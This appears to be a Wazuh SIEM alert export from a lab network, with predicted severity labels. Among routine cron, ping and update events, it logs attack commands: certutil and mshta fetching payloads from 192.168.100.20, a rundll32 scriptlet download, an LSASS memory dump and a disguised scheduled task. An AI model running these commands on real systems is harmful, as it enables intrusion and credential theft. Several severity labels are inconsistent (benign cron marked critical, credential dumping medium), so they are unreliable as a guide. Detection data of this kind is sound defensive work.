@timestamp,agent.name,agent.id,rule.id,rule.description,rule.level,rule.mitre.id,location,data.win.eventdata.commandLine,raw,severity_pred
2025-12-28T01:49:16.759Z,Endpoint3-Win,1,92213,Executable file dropped in folder commonly used by malware,15,T1105,EventChannel,,"{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 46, ""mail"": true, ""level"": 15, ""description"": ""Executable file dropped in folder commonly used by malware"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1105""]}, ""id"": ""92213""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T01:49:16.759Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T01:49:16.759Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": """", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""12490"", ""utcTime"": ""2025-12-28 01:49:16.759"", ""targetFilename"": ""C:\\Users\\ayoub\\AppData\\Local\\Temp\\svchost.exe""}}}}",critical
2025-12-28T16:03:07.459Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 49, ""mail"": true, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T16:03:07.459Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-28T16:03:07.459Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-28T16:03:07.459+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",critical
2025-12-30T02:50:13.432Z,Endpoint2-Win,2,92033,Scheduled task created,8,T1053.005,EventChannel,"schtasks /create /tn \""AdobeUpdate\"" /sc minute /mo 30 /tr \""C:\Users\ayoub\AppData\Local\Temp\updater.exe\"" /f","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 14, ""mail"": true, ""level"": 8, ""description"": ""Scheduled task created"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1053.005""]}, ""id"": ""92033""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T02:50:13.432Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T02:50:13.432Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""schtasks /create /tn \\\""AdobeUpdate\\\"" /sc minute /mo 30 /tr \\\""C:\\Users\\ayoub\\AppData\\Local\\Temp\\updater.exe\\\"" /f"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""6514"", ""utcTime"": ""2025-12-30 02:50:13.432""}}}}",critical
2025-12-28T06:45:12.389Z,Endpoint3-Win,1,92080,Credential dumping attempt detected via LSASS access,16,T1003.001,EventChannel,"\""C:\Windows\System32\rundll32.exe\"" C:\Windows\System32\comsvcs.dll, MiniDump 688 C:\Users\ayoub\AppData\Local\Temp\lsass.dmp full","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 39, ""mail"": false, ""level"": 16, ""description"": ""Credential dumping attempt detected via LSASS access"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1003.001""]}, ""id"": ""92080""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T06:45:12.389Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T06:45:12.389Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\rundll32.exe\\\"" C:\\Windows\\System32\\comsvcs.dll, MiniDump 688 C:\\Users\\ayoub\\AppData\\Local\\Temp\\lsass.dmp full"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""1711"", ""utcTime"": ""2025-12-28 06:45:12.389""}}}}",medium
2025-12-29T15:02:48.127Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 6, ""mail"": true, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T15:02:48.127Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-29T15:02:48.127Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-29T15:02:48.127+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",critical
2025-12-30T12:23:43.643Z,Endpoint1-Win,3,91530,User executed network diagnostics,2,,EventChannel,"\""C:\Windows\System32\ping.exe\"" 8.8.8.8 -n 2","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 37, ""mail"": false, ""level"": 2, ""description"": ""User executed network diagnostics"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91530""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T12:23:43.643Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T12:23:43.643Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\ping.exe\\\"" 8.8.8.8 -n 2"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""12543"", ""utcTime"": ""2025-12-30 12:23:43.643""}}}}",low
2025-12-28T03:20:12.677Z,Endpoint3-Win,1,92052,Command prompt started by abnormal process,6,T1059.003,EventChannel,"\""cmd.exe\"" /c certutil -urlcache -split -f http://192.168.100.20/payload.exe C:\Users\ayoub\AppData\Local\Temp\svchost.exe","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 6, ""mail"": true, ""level"": 6, ""description"": ""Command prompt started by abnormal process"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.003""]}, ""id"": ""92052""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T03:20:12.677Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T03:20:12.677Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\cmd.exe"", ""commandLine"": ""\\\""cmd.exe\\\"" /c certutil -urlcache -split -f http://192.168.100.20/payload.exe C:\\Users\\ayoub\\AppData\\Local\\Temp\\svchost.exe"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""4814"", ""utcTime"": ""2025-12-28 03:20:12.677""}}}}",critical
2025-12-29T03:40:47.284Z,Endpoint3-Win,1,91530,User executed network diagnostics,2,,EventChannel,"\""C:\Windows\System32\ping.exe\"" 8.8.8.8 -n 2","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 11, ""mail"": false, ""level"": 2, ""description"": ""User executed network diagnostics"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91530""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T03:40:47.284Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T03:40:47.284Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\ping.exe\\\"" 8.8.8.8 -n 2"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""6820"", ""utcTime"": ""2025-12-29 03:40:47.284""}}}}",medium
2025-12-30T00:48:02.273Z,Endpoint2-Win,2,91533,Legitimate ipconfig execution,2,,EventChannel,"\""C:\Windows\System32\ipconfig.exe\"" /all","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 42, ""mail"": false, ""level"": 2, ""description"": ""Legitimate ipconfig execution"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91533""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T00:48:02.273Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T00:48:02.273Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\ipconfig.exe\\\"" /all"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""10980"", ""utcTime"": ""2025-12-30 00:48:02.273""}}}}",low
2025-12-29T14:53:41.746Z,Endpoint2-Win,2,92090,Suspicious LOLBin mshta used to execute remote script,12,T1218.005,EventChannel,"\""C:\Windows\System32\mshta.exe\"" http://192.168.100.20/a.hta","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 25, ""mail"": false, ""level"": 12, ""description"": ""Suspicious LOLBin mshta used to execute remote script"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1218.005""]}, ""id"": ""92090""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T14:53:41.746Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T14:53:41.746Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\mshta.exe\\\"" http://192.168.100.20/a.hta"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""11485"", ""utcTime"": ""2025-12-29 14:53:41.746""}}}}",low
2025-12-30T01:51:07.332Z,Endpoint2-Win,2,91501,Windows update executed successfully,3,,EventChannel,"\""C:\Windows\System32\UsoClient.exe\"" StartScan","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 15, ""mail"": true, ""level"": 3, ""description"": ""Windows update executed successfully"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91501""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T01:51:07.332Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T01:51:07.332Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\UsoClient.exe\\\"" StartScan"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""1525"", ""utcTime"": ""2025-12-30 01:51:07.332""}}}}",critical
2025-12-29T05:12:42.274Z,Endpoint1-Win,3,92080,Credential dumping attempt detected via LSASS access,16,T1003.001,EventChannel,"\""C:\Windows\System32\rundll32.exe\"" C:\Windows\System32\comsvcs.dll, MiniDump 688 C:\Users\ayoub\AppData\Local\Temp\lsass.dmp full","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 14, ""mail"": true, ""level"": 16, ""description"": ""Credential dumping attempt detected via LSASS access"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1003.001""]}, ""id"": ""92080""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T05:12:42.274Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T05:12:42.274Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\rundll32.exe\\\"" C:\\Windows\\System32\\comsvcs.dll, MiniDump 688 C:\\Users\\ayoub\\AppData\\Local\\Temp\\lsass.dmp full"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""9179"", ""utcTime"": ""2025-12-29 05:12:42.274""}}}}",critical
2025-12-30T16:25:14.936Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 17, ""mail"": false, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T16:25:14.936Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-30T16:25:14.936Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-30T16:25:14.936+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",low
2025-12-30T06:14:54.574Z,Endpoint2-Win,2,91533,Legitimate ipconfig execution,2,,EventChannel,"\""C:\Windows\System32\ipconfig.exe\"" /all","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 38, ""mail"": false, ""level"": 2, ""description"": ""Legitimate ipconfig execution"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91533""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T06:14:54.574Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T06:14:54.574Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\ipconfig.exe\\\"" /all"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""10560"", ""utcTime"": ""2025-12-30 06:14:54.574""}}}}",low
2025-12-29T02:21:35.224Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 33, ""mail"": false, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T02:21:35.224Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-29T02:21:35.224Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-29T02:21:35.224+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",low
2025-12-30T07:02:03.048Z,Endpoint3-Win,1,91512,Google Chrome update check executed,2,,EventChannel,"\""C:\Program Files\Google\Update\GoogleUpdate.exe\"" /c","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 41, ""mail"": false, ""level"": 2, ""description"": ""Google Chrome update check executed"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91512""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T07:02:03.048Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T07:02:03.048Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Program Files\\Google\\Update\\GoogleUpdate.exe\\\"" /c"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""12149"", ""utcTime"": ""2025-12-30 07:02:03.048""}}}}",medium
2025-12-29T19:25:45.065Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 34, ""mail"": false, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T19:25:45.065Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-29T19:25:45.065Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-29T19:25:45.065+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",low
2025-12-30T01:32:12.738Z,Endpoint3-Win,1,92091,Suspicious rundll32 remote scriptlet execution,12,T1218.011,EventChannel,"\""C:\Windows\System32\rundll32.exe\"" javascript:\""..\mshtml,RunHTMLApplication \"";document.write();GetObject(\""script:http://192.168.100.20/s.sct\"")","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 49, ""mail"": false, ""level"": 12, ""description"": ""Suspicious rundll32 remote scriptlet execution"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1218.011""]}, ""id"": ""92091""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T01:32:12.738Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T01:32:12.738Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\rundll32.exe\\\"" javascript:\\\""..\\mshtml,RunHTMLApplication \\\"";document.write();GetObject(\\\""script:http://192.168.100.20/s.sct\\\"")"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""11501"", ""utcTime"": ""2025-12-30 01:32:12.738""}}}}",medium
